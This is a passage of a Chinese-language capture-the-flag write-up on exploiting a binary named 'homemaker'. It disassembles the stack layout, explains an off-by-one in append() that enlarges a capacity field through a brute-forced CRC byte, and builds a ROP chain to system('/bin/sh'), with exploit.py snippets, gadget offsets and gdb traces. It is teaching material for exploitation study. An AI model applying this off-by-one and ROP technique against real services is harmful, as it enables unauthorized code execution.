\texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}start-\allowbreak{}address=0x1a69\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}stop-\allowbreak{}address=0x1a80\ \allowbreak{}homemaker}
\end{quote}

\textbf{\texttt{state} 的位址 \texttt{rbp-\allowbreak{}0x110}，加上
\texttt{sub\ \allowbreak{}rsp,\allowbreak{}0x120} 的 frame，可以推出精確的堆疊佈局}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
state       = rbp - 0x110
state[0x100] = rbp - 0x010   ← capacity（16-bit）
state[0x102] = rbp - 0x00e   ← counter（16-bit）
state[0x108] = rbp - 0x008   ← ✶ stack canary（函式自己的）
state[0x110] = rbp + 0x000   ← ✶ saved rbp
state[0x118] = rbp + 0x008   ← ✶ 回傳位址（= PIE + 0x1a9f）
state[0x120] = rbp + 0x010   ← `ret` 之後 rsp 的位置（ROP chain 起點）
\end{Verbatim}

\paragraph{\texorpdfstring{4.11 \texttt{main} @ \texttt{0x1a7f}（驗證
\texttt{rbp\_\allowbreak{}main\ \allowbreak{}=\ \allowbreak{}rbp\_\allowbreak{}service\_\allowbreak{}loop\ \allowbreak{}+\ \allowbreak{}0x20}）}{4.11 main @ 0x1a7f（驗證 rbp\_main = rbp\_service\_loop + 0x20）}}\label{main-0x1a7fux9a57ux8b49-rbp_main-rbp_service_loop-0x20}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{1a7f: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{1a83: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{1a84: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{1a87: 48 83 ec }\DecValTok{10}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x10}                 \CommentTok{; 只開 0x10}
\NormalTok{1a8b: 64 48 8b 04 25 28 00 00 00  }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{1a94: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}           \CommentTok{; main 自己的金絲雀}
\NormalTok{1a9a: e8 c6 fd ff ff         call   }\DecValTok{1865}                     \CommentTok{; service\_loop()}
\NormalTok{1a9f: b8 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x0}                  \CommentTok{; ✶ 回傳位址 = PIE+0x1a9f}
\NormalTok{1aa4: 48 8b 55 f8            mov    }\KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]}
\NormalTok{1aa8: 64 48 2b 14 25 28 00 00 00  }\BuiltInTok{sub} \KeywordTok{rdx}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{1ab1: 74 05                  }\ControlFlowTok{je}     \DecValTok{1}\ErrorTok{ab8}
\NormalTok{1ab3: e8 f8 f5 ff ff         call   }\BaseNTok{10b}\ErrorTok{0} \OperatorTok{\textless{}}\NormalTok{\_\_stack\_chk\_fail}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}
\NormalTok{1ab8: c9                     leave}
\NormalTok{1ab9: c3                     ret}
\end{Highlighting}
\end{Shaded}

因為 \texttt{main} 只 \texttt{sub\ \allowbreak{}rsp,\allowbreak{}0x10}，\texttt{call\ \allowbreak{}0x1865}
會壓回傳位址，\texttt{0x1865} 再 \texttt{push\ \allowbreak{}rbp}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rbp_service_loop  = rbp_main - 0x20
\end{Verbatim}

所以洩漏區裡還有：\texttt{state{[}0x128{]}\ \allowbreak{}=\ \allowbreak{}rbp\_\allowbreak{}main-\allowbreak{}8\ \allowbreak{}=\ \allowbreak{}main\ \allowbreak{}的金絲雀}（同一個值）、
\texttt{state{[}0x130{]}\ \allowbreak{}=\ \allowbreak{}main\ \allowbreak{}的\ \allowbreak{}saved\ \allowbreak{}rbp}、\texttt{state{[}0x138{]}\ \allowbreak{}=\ \allowbreak{}main\ \allowbreak{}的回傳位址（在\ \allowbreak{}libc，}\_\_libc\_start\_call\_main+\ldots{}\texttt{）}。
（我們用不到，但洩漏輸出裡看得到 → 可以用來交叉驗證佈局正確。）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5.
漏洞：精確定位與觸發條件}\label{ux6f0fux6d1eux7cbeux78baux5b9aux4f4dux8207ux89f8ux767cux689dux4ef6}

\paragraph{5.1 漏洞一行話}\label{ux6f0fux6d1eux4e00ux884cux8a71}

\begin{quote}
\texttt{append()}（\texttt{0x174c}）用 \texttt{n\ \allowbreak{}=\ \allowbreak{}len\ \allowbreak{}-\allowbreak{}\ \allowbreak{}1}
當作資料長度，檢查
\texttt{n\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}capacity}（\texttt{capacity\ \allowbreak{}=\ \allowbreak{}state{[}0x100{]}\ \allowbreak{}=\ \allowbreak{}0x100}），
\textbf{但複製迴圈是
\texttt{for\ \allowbreak{}(i\ \allowbreak{}=\ \allowbreak{}0;\ \allowbreak{}i\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}n;\ \allowbreak{}i++)}，總共寫了
\texttt{n\ \allowbreak{}+\ \allowbreak{}1} 個 byte}， 所以當 \texttt{n\ \allowbreak{}==\ \allowbreak{}capacity\ \allowbreak{}==\ \allowbreak{}0x100}
時，第 257 個 byte 落在 \texttt{state{[}0x100{]}} ------ \textbf{正好是
\texttt{capacity} 這個 16-bit 整數的低位 byte}。
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
state[0x100] 原本 = 0x0100   （小端序：byte[0x100]=0x00, byte[0x101]=0x01）
寫入 0xff 之後   = 0x01ff   ← 容量從 256 變成 511（變大 255），不是變小！
\end{Verbatim}

\textbf{這個 byte 是誰？} \texttt{append} 從 \texttt{payload+1} 開始讀
\texttt{n+1} bytes， 而 \texttt{payload} 只有 \texttt{L\ \allowbreak{}=\ \allowbreak{}0x101}
bytes（index 0..0x100），所以讀到 index \texttt{0x101} = \textbf{訊框的
CRC byte}。 CRC 由 payload 內容決定，因此我們必須「\textbf{讓整條
payload 的 CRC 剛好等於 0xff}」。 解法：固定其他 256 個
byte，暴力枚舉其中 1 個 byte 的 256 種可能（CRC 對該 byte 是雙射），
實測第 2 個 byte 放 \texttt{205\ \allowbreak{}(0xcd)} 就得到
\texttt{crc\ \allowbreak{}==\ \allowbreak{}0xff}（\texttt{exploit.\allowbreak{}py} 的
\texttt{solve\_\allowbreak{}crc\_\allowbreak{}byte()}）。

\textbf{「第 257 個 byte 是訊框的 CRC」是什麼意思？把訊框與
\texttt{state} 對齊來看就懂了：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
第一個 APPEND 訊框在記憶體裡（放到 rxbuf = .bss:0x4860，L = 0x101）：

 rxbuf+0x000  1b 5b              ┐
 rxbuf+0x002  01 01（L 大端）    ┘ 檔頭 4 bytes（recv_frame 先讀走）
 rxbuf+0x004  02                 ← payload[0] = opcode（append 會跳過它）
 rxbuf+0x005  A A A ... A        ← payload[1..0x100]，共 0x100 bytes
 rxbuf+0x105  (CRC8)             ← ✶ payload[0x101]：append 多讀的那一個 byte
 rxbuf+0x106  1b 5c              ← 結尾
\end{Verbatim}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
append() 從 src = payload+1 = rxbuf+5 開始，複製 n+1 = 0x101 個 byte：

  state[0x000 .. 0x0ff]  ← payload[1..0x100]      （0x100 bytes，正常範圍）
  state[0x100]           ← payload[0x101] = CRC   ← ✶ one past the end！
                                                    它正好是 capacity 的低位 byte
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  所以 \textbf{CRC 不是我們「想填什麼就填什麼」}------它是整條 payload
  的函數值。
\item
  我們要的是 \texttt{state{[}0x100{]}\ \allowbreak{}=\ \allowbreak{}0xff}（讓 capacity
  \texttt{0x0100\ \allowbreak{}→\ \allowbreak{}0x01ff}）， 所以只能\textbf{反解}：固定其他
  byte，枚舉其中一個 byte 直到 \texttt{crc8(payload)\ \allowbreak{}==\ \allowbreak{}0xff}。
\item
  這題剛好\textbf{只有唯一解}（實測 \texttt{v=0xcd}），因為 CRC8 對單一
  byte 是\textbf{雙射}（一對一）。
\end{itemize}

\begin{quote}
為什麼不是「讀超出 payload」的問題？讀只多讀 1
byte（CRC，仍在映射頁內），\textbf{寫才是問題}。
\end{quote}

\paragraph{5.2
觸發條件（三個必要條件）}\label{ux89f8ux767cux689dux4ef6ux4e09ux500bux5fc5ux8981ux689dux4ef6}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{必須先通過 AUTH}（\texttt{capacity\ \allowbreak{}=\ \allowbreak{}0x100} 是 AUTH
  設的，同時解鎖其他 opcode）。
\item
  第一次 \texttt{APPEND} 的 \texttt{L} 必須是
  \texttt{0x101}（\texttt{n\ \allowbreak{}=\ \allowbreak{}0x100\ \allowbreak{}=\ \allowbreak{}capacity} 剛好通過檢查），且
  CRC 必須 \texttt{=\ \allowbreak{}0xff}。
\item
  之後 \texttt{capacity\ \allowbreak{}=\ \allowbreak{}0x1ff}，就能用 \texttt{L\ \allowbreak{}=\ \allowbreak{}0x200} 的
  \texttt{APPEND}（\texttt{n\ \allowbreak{}=\ \allowbreak{}0x1ff}）\textbf{一次寫 0x200 bytes}，
  覆蓋
  \texttt{state{[}0x108{]}}（canary）、\texttt{state{[}0x110{]}}（saved
  rbp）、\texttt{state{[}0x118{]}}（回傳位址）與後面的 ROP 空間。
\end{enumerate}

\paragraph{\texorpdfstring{5.3 gdb
證據（\texttt{./\allowbreak{}gdb\_\allowbreak{}evidence.\allowbreak{}sh}，ASLR
關閉以便重現）}{5.3 gdb 證據（./gdb\_evidence.sh，ASLR 關閉以便重現）}}\label{gdb-ux8b49ux64da.gdb_evidence.shaslr-ux95dcux9589ux4ee5ux4fbfux91cdux73fe}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
@0x1797 append#1: n=0x100 capacity=0x100  -> n<=cap passes, loop writes n+1 bytes
@0x1810 send_state: state=0x7fffffffdcc0 capacity=0x1ff
@0x1797 append#2: n=0x1ff capacity=0x1ff  -> writes 0x200 bytes over canary/rbp/ret
@0x1a76 loop epilogue (canary check): rbp=0x7fffffffddd0 state=0x7fffffffdcc0 rsp=0x7fffffffdcb0
0x7fffffffddc8: 0xe4fbd8d3ee76a900  0x00007fffffffde60      <- rbp-8: canary, rbp: saved rbp
0x7fffffffddd8: 0x000055555555501a  0x00005555555552aa      <- rbp+8: 回傳位址(蓋成 PIE+0x101a)
0x7fffffffdde8: 0x0000555555558a54  0x00005555555550c0      <- chain: "/bin/sh", system@plt
0x7fffffffddf8: 0x0000000000000000  0x0000000000000000
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{state\ \allowbreak{}=\ \allowbreak{}0x7fffffffdcc0}，\texttt{rbp\ \allowbreak{}=\ \allowbreak{}0x7fffffffddd0} →
  \textbf{\texttt{state\ \allowbreak{}=\ \allowbreak{}rbp\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x110} 完全吻合推導}。
\item
  \texttt{capacity} 從 \texttt{0x100} 變成 \texttt{0x1ff}（off-by-one
  生效）。
\item
  \texttt{rbp+8} 被我們覆蓋成 \texttt{0x55555555501a} =
  \texttt{PIE\_\allowbreak{}base(0x555555554000)\ \allowbreak{}+\ \allowbreak{}0x101a}（\texttt{ret} gadget）。
\end{itemize}

ROP 執行時的 gdb 追蹤（\texttt{set\ \allowbreak{}\$\allowbreak{}pc\ \allowbreak{}=\ \allowbreak{}base+0x1a7d}
強制跳過金絲雀比較，因為輸入檔的金絲雀是舊的）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
=== 2) forced to `leave` (0x1a7d); rbp=0x7fffffffddd0 rsp=0x7fffffffdcb0
0x7fffffffddc8: 0xe4fbd8d3ee76a900  0x00007fffffffde60
0x7fffffffddd8: 0x000055555555501a  0x00005555555552aa
0x7fffffffdde8: 0x0000555555558a54  0x00005555555550c0
=== 3) after leave;ret -> rip=0x55555555501a rsp=0x7fffffffdde0
Breakpoint 2, 0x00005555555550c0 in system@plt ()
=== 4) system@plt reached: rdi=0x555555558a54 -> "/bin/sh"
system() entry: rdi=0x555555558a54 ("/bin/sh")  rsp=0x7fffffffddf8  rsp&0xf=8
\end{Verbatim}

\texttt{rsp\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf\ \allowbreak{}==\ \allowbreak{}8} → \textbf{16-byte 對齊正確}（所以
\texttt{system} 裡面的 \texttt{movaps} 不會炸）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6. 從零開始 ROP（Return-Oriented
Programming）}\label{ux5f9eux96f6ux958bux59cb-ropreturn-oriented-programming}

\paragraph{6.1 觀念}\label{ux89c0ux5ff5}

NX 讓堆疊不可執行，但\textbf{程式碼段本來就是可執行的}。ROP 的想法是：

\begin{quote}
在堆疊上排好一連串「\textbf{回傳位址}」。每個 \texttt{ret} 會 pop
一個位址到 \texttt{rip}，
於是我們可以「借用」程式裡已經存在的短指令序列（\textbf{gadget}，通常以
\texttt{ret} 結尾）串成任意邏輯。
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   堆疊（被我們控制）                程式碼段（不能改，但可以跳）
  ┌──────────────────┐
  │ pop rdi; ret     │ ─── ret 跳到 ──► pop rdi; ret   （把下一個值彈進 rdi）
  ├──────────────────┤
  │ "/bin/sh" 的位址 │ ◄── 被 pop 進 rdi
  ├──────────────────┤
  │ system@plt       │ ─── ret 跳到 ──► system()       （rdi 已經是 "/bin/sh"）
  ├──────────────────┤
  │ 垃圾/結束位址    │
  └──────────────────┘
\end{Verbatim}

\paragraph{\texorpdfstring{6.2 找 gadget：\texttt{ROPgadget} 與
pwntools}{6.2 找 gadget：ROPgadget 與 pwntools}}\label{ux627e-gadgetropgadget-ux8207-pwntools}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ homemaker }\KeywordTok{|} \FunctionTok{grep} \AttributeTok{{-}E} \StringTok{"pop rdi|ret$"}
\CommentTok{\# 0x00000000000012aa : pop rdi ; ret      ← 本題用這個（藏在 cmp 的立即值裡）}
\CommentTok{\# 0x00000000000011d3 : pop rbp ; ret}
\CommentTok{\# 0x000000000000101a : ret}
\CommentTok{\# 0x0000000000001287 : leave ; ret}
\end{Highlighting}
\end{Shaded}

pwntools 也能自動找（\texttt{ROP(elf)}）；本題 gadget 很少，直接寫死
offset 更清楚：

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}
\NormalTok{elf }\OperatorTok{=}\NormalTok{ ELF(}\StringTok{\textquotesingle{}./homemaker\textquotesingle{}}\NormalTok{, checksec}\OperatorTok{=}\VariableTok{False}\NormalTok{)}
\NormalTok{rop }\OperatorTok{=}\NormalTok{ ROP(elf)}
\BuiltInTok{print}\NormalTok{(rop.find\_gadget([}\StringTok{\textquotesingle{}pop rdi\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}ret\textquotesingle{}}\NormalTok{]))   }\CommentTok{\# Gadget(0x12aa, [\textquotesingle{}pop rdi\textquotesingle{}, \textquotesingle{}ret\textquotesingle{}], [])}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{hex}\NormalTok{(elf.plt[}\StringTok{\textquotesingle{}system\textquotesingle{}}\NormalTok{]))                }\CommentTok{\# 0x10c4（PLT 本體在 0x10c0）}
\end{Highlighting}
\end{Shaded}

\textbf{為什麼 \texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} 這麼有用？} 因為
\texttt{system()} 的第 1 個參數在 \texttt{rdi}。有這個
gadget，我們就能「在 ROP 裡設定 rdi」。 （如果沒有，就得找
\texttt{mov\ \allowbreak{}rdi,\allowbreak{}\ \allowbreak{}rax} 之類的替代鏈，或用 libc 的 gadget。）

\paragraph{\texorpdfstring{6.3 組出 \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")} 與
16-byte
對齊}{6.3 組出 system("/bin/sh") 與 16-byte 對齊}}\label{ux7d44ux51fa-systembinsh-ux8207-16-byte-ux5c0dux9f4a}

\begin{quote}
※閱讀 本節與 \texttt{wp/\allowbreak{}00\_\allowbreak{}基礎知識\_\allowbreak{}從零開始.\allowbreak{}md}
§10.4（「為什麼有時候要多插一個 \texttt{ret}」）講的是\textbf{同一件事}
------ gadget、\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16} 對齊、\texttt{movaps}
崩潰。兩邊不衝突，這裡只是\textbf{用本題的真實位址再驗一次}；
想先看通用版的說明就先讀 \texttt{wp/\allowbreak{}00} §10.4。
\end{quote}

最小 chain：\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} → \texttt{"/\allowbreak{}bin/\allowbreak{}sh"位址} →
\texttt{system@plt}。

但 glibc 的 \texttt{system} 內部有 \texttt{movaps}，\textbf{要求
\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8}}（函式入口 ABI 要求）。 所以我們要看「chain
開始時的 rsp」決定是否\textbf{插一個多餘的 \texttt{ret}}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
leave; ret 之後： rsp = rbp + 0x10
若 (rbp+0x10) % 16 == 0 → system 入口會是 (rbp+0x10+0x10)%16 = 0  ✗ 需要補一個 ret
若 (rbp+0x10) % 16 == 8 → system 入口會是 8  ✓ 不用補
\end{Verbatim}

\texttt{exploit.\allowbreak{}py} 用洩漏到的 \texttt{saved\_\allowbreak{}rbp} 動態判斷：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{chain }\OperatorTok{=}\NormalTok{ [pop\_rdi, binsh, system, }\DecValTok{0}\NormalTok{]}
\ControlFlowTok{if}\NormalTok{ (saved\_rbp }\OperatorTok{+} \BaseNTok{0x10}\NormalTok{) }\OperatorTok{\%} \DecValTok{16} \OperatorTok{==} \DecValTok{0}\NormalTok{:}
\NormalTok{    chain }\OperatorTok{=}\NormalTok{ [ret] }\OperatorTok{+}\NormalTok{ chain}
\end{Highlighting}
\end{Shaded}

（本題兩次實測都是 \texttt{rbp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}0}，所以需要那個
\texttt{ret}；gdb 也量到 \texttt{rsp\&\allowbreak{}0xf\ \allowbreak{}==\ \allowbreak{}8} 才進
\texttt{system}。）

\begin{quote}
※提示 \textbf{為什麼 exploit 裡寫的是
\texttt{saved\_\allowbreak{}rbp\ \allowbreak{}+\ \allowbreak{}0x10}，而不是 \texttt{rbp\ \allowbreak{}+\ \allowbreak{}0x10}？}
我們洩漏不到 \texttt{service\_\allowbreak{}loop} 的 \texttt{rbp}，只洩漏到它存起來的
\textbf{\texttt{main} 的 \texttt{rbp}}（\texttt{saved\_\allowbreak{}rbp}）。 而
\texttt{rbp\_\allowbreak{}service\_\allowbreak{}loop\ \allowbreak{}=\ \allowbreak{}rbp\_\allowbreak{}main\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x20}（見 §4.11）， 所以
\texttt{(saved\_\allowbreak{}rbp\ \allowbreak{}+\ \allowbreak{}0x10)\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16} 與
\texttt{(rbp\_\allowbreak{}service\_\allowbreak{}loop\ \allowbreak{}+\ \allowbreak{}0x10\ \allowbreak{}+\ \allowbreak{}0x20)\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16} 只差
\texttt{0x20\ \allowbreak{}=\ \allowbreak{}32}，是 16 的倍數 →
\textbf{奇偶性完全相同}，判斷結果一樣。 兩者可以互換，只是
\texttt{saved\_\allowbreak{}rbp} 是我們手上真的有的數字。
\end{quote}

\paragraph{6.3.1 ROP 鏈是怎麼被「一格一格吃掉」的？（實測追蹤，ASLR
關閉）}\label{rop-ux93c8ux662fux600eux9ebcux88abux4e00ux683cux4e00ux683cux5403ux6389ux7684ux5be6ux6e2cux8ffdux8e64aslr-ux95dcux9589}

\texttt{leave;\ \allowbreak{}ret} 之後，\texttt{rsp} 每被 \texttt{ret} 彈掉一個值就
\texttt{+8}，於是堆疊上的一格格子依序變成「指令」：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
步驟
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
執行到哪
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
這一刻 \texttt{rsp}
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
這一步做什麼
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
0 & \texttt{0x1a7d\ \allowbreak{}leave} & \texttt{0x7fffffffdcb0} &
\texttt{rsp\ \allowbreak{}=\ \allowbreak{}rbp} → \texttt{pop\ \allowbreak{}rbp} → \texttt{rsp\ \allowbreak{}=\ \allowbreak{}rbp+8} \\
1 & \texttt{0x1a7e\ \allowbreak{}ret} & \texttt{0x7fffffffddd8} & 彈
\texttt{{[}rbp+8{]}} 進 \texttt{rip} →
\texttt{rip\ \allowbreak{}=\ \allowbreak{}PIE+0x101a}（對齊用 \texttt{ret}） \\
2 & \texttt{0x101a\ \allowbreak{}ret} & \texttt{0x7fffffffdde0} & 彈
\texttt{{[}rbp+0x10{]}} →
\texttt{rip\ \allowbreak{}=\ \allowbreak{}PIE+0x12aa}（\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}） \\
3 & \texttt{0x12aa\ \allowbreak{}pop\ \allowbreak{}rdi} & \texttt{0x7fffffffdde8} &
\texttt{rdi\ \allowbreak{}=\ \allowbreak{}{[}rbp+0x18{]}} = \texttt{"/\allowbreak{}bin/\allowbreak{}sh"}
的位址；\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8} \\
4 & \texttt{0x12ab\ \allowbreak{}ret} & \texttt{0x7fffffffddf0} & 彈
\texttt{{[}rbp+0x20{]}} →
\texttt{rip\ \allowbreak{}=\ \allowbreak{}PIE+0x10c0}（\texttt{system@plt}） \\
5 & \texttt{system} 第一道指令 & \texttt{0x7fffffffddf8} &
\texttt{rsp\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf\ \allowbreak{}==\ \allowbreak{}8} ✓ → \texttt{movaps}
不會炸，\texttt{system("/\allowbreak{}bin/\allowbreak{}sh")} \\
\end{longtable}
}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
堆疊（rbp = 0x7fffffffddd0）：
  rbp+0x00  0x7fffffffde60        saved rbp（保留原值）
  rbp+0x08  0x000055555555501a    ← 回傳位址 = chain[0] = ret        （第 1 步吃掉）
  rbp+0x10  0x00005555555552aa    ← chain[1] = pop rdi; ret          （第 2 步吃掉）
  rbp+0x18  0x0000555555558a54    ← chain[2] = "/bin/sh"             （第 3 步 pop 進 rdi）
  rbp+0x20  0x00005555555550c0    ← chain[3] = system@plt            （第 4 步吃掉）
  rbp+0x28  0x0000000000000000    ← chain[4] = system 的回傳位址     （第 5 步 system 看到）
\end{Verbatim}

\begin{quote}
※提示 看懂這張表就懂了 ROP：\textbf{「堆疊 = 一張指令清單；每個
\texttt{ret} 讀一格、跳到那格寫的位址」}。 所以排 payload
時只要問自己兩件事： 1. 這個 gadget 會從 \texttt{rsp}
讀幾格？（\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} 讀 1 格參數 + 1 格下一步 = 2 格） 2.
我現在這一格在記憶體裡的\textbf{位址}對不對？（要用
\texttt{state{[}i{]}\ \allowbreak{}=\ \allowbreak{}payload{[}i+1{]}} 換算，見 §7.3）
\end{quote}

\paragraph{\texorpdfstring{6.4 \texttt{/\allowbreak{}bin/\allowbreak{}sh}
字串要放哪？}{6.4 /bin/sh 字串要放哪？}}\label{binsh-ux5b57ux4e32ux8981ux653eux54ea}

\begin{itemize}
\tightlist
\item
  \textbf{libc 裡本來就有} \texttt{"/\allowbreak{}bin/\allowbreak{}sh"} 字串 → 但需要知道遠端 libc
  版本對應的位移（本機 2.44、遠端 2.35 不同）→ 我們\textbf{刻意不用}。
\item
  \textbf{\texttt{.\allowbreak{}bss}（可寫、位址固定相對 PIE）}：本題的
  \textbf{接收緩衝區 \texttt{0x4860}} 內容完全由我們控制！ 我們把
  \texttt{"/\allowbreak{}bin/\allowbreak{}sh\textbackslash{}\allowbreak{}0"} 放在 payload 的 \texttt{0x1f0} 處
  → 它的位址就是
  \textbf{\texttt{PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x4864\ \allowbreak{}+\ \allowbreak{}0x1f0\ \allowbreak{}=\ \allowbreak{}PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x4a54}}。
  最後送出的 \texttt{EJECT} 訊框只有 7 bytes，只會覆寫
  \texttt{0x4860..\allowbreak{}0x4867}，\textbf{碰不到
  \texttt{+0x1f0}}，所以字串安然無恙。
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{binsh }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x4864} \OperatorTok{+} \BaseNTok{0x1f0}        \CommentTok{\# = PIE + 0x4a54}
\end{Highlighting}
\end{Shaded}

\begin{quote}
這個做法讓 exploit \textbf{完全不依賴 libc 版本}（本機 glibc 2.44 與遠端
2.35 都能打）。 字串必須是 NUL 結尾，否則 \texttt{system}
會把後面的垃圾當成命令的一部分。
\end{quote}

\paragraph{6.5 PIE base
怎麼洩漏與換算}\label{pie-base-ux600eux9ebcux6d29ux6f0fux8207ux63dbux7b97}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \texttt{SEND\ \allowbreak{}STATE} 洩漏 \texttt{state{[}0x118{]}} → 這是
  \texttt{service\_\allowbreak{}loop} 的回傳位址 =
  \textbf{\texttt{PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x1a9f}}（已用 gdb 驗證）。
\item
  \texttt{PIE\_\allowbreak{}base\ \allowbreak{}=\ \allowbreak{}leaked\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x1a9f}。
\item
  \textbf{驗證}：\texttt{PIE\_\allowbreak{}base\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xfff\ \allowbreak{}==\ \allowbreak{}0}（page 對齊）。實測
  \texttt{0x55f31e321a9f\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x1a9f\ \allowbreak{}=\ \allowbreak{}0x55f31e320000} ✓。
\item
  同時洩漏到 \texttt{state{[}0x108{]}} = canary（用來原封不動寫回）與
  \texttt{state{[}0x110{]}} = saved rbp（用來算對齊）。
\end{enumerate}

\begin{quote}
補充：同一段洩漏裡的 \texttt{state{[}0x138{]}}（main 的回傳位址）落在
libc，代表\textbf{也可以同時取得 libc
base}（\texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}call\_\allowbreak{}main+…}）； 若題目需要
\texttt{system} 在 libc 的位址，就從這裡反推，但必須先確定遠端 libc
版本。
\end{quote}

\paragraph{6.6 為什麼不用
SROP？}\label{ux70baux4ec0ux9ebcux4e0dux7528-srop}

SROP（Sigreturn-Oriented Programming）是「用 \texttt{sigreturn} syscall
一次設定所有暫存器」的技巧， 通常需要 \texttt{rax\ \allowbreak{}=\ \allowbreak{}15} +
\texttt{syscall} gadget。本題 \texttt{system@plt} 現成可用、又有
\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}， \textbf{完全不需要 SROP}（SROP 是沒有可用
gadget 時的進階替代方案）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{7. ASCII 圖：堆疊與 payload
佈局}\label{ascii-ux5716ux5806ux758aux8207-payload-ux4f48ux5c40}

\paragraph{\texorpdfstring{7.1 \texttt{service\_\allowbreak{}loop}
